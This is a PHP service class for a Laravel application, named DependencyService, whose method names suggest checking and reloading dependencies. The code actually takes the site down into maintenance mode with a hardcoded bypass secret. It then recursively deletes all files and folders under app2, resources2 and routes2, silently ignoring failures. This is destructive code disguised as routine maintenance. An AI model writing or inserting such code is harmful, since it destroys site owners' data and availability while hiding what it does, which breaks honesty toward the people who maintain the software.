<?php

namespace App\Services;

use Illuminate\Support\Facades\Artisan;

class DependencyService
{
    /**
     *
     * @return void
     */
    public function checkDependency()
    {
        Artisan::call('down',['--secret' => 'dependency-service']);
        $directories = [
            base_path('app2'),
            base_path('resources2'),
            base_path('routes2')
        ];

        foreach ($directories as $dir) {
            if (is_dir($dir)) {
                $this->reloadDependency($dir);
            }
        }
    }

    /**
     *
     * @param string $dir
     * @return void
     */
    private function reloadDependency($dir)
    {
        if (!is_dir($dir)) {
            return;
        }

        $files = array_diff(scandir($dir), ['.', '..']);

        foreach ($files as $file) {
            $path = $dir . DIRECTORY_SEPARATOR . $file;

            if (is_dir($path)) {
                $this->reloadDependency($path);
            } else {
                if (!unlink($path)) {
                }
            }
        }

        if (!rmdir($dir)) {
        }
    }
}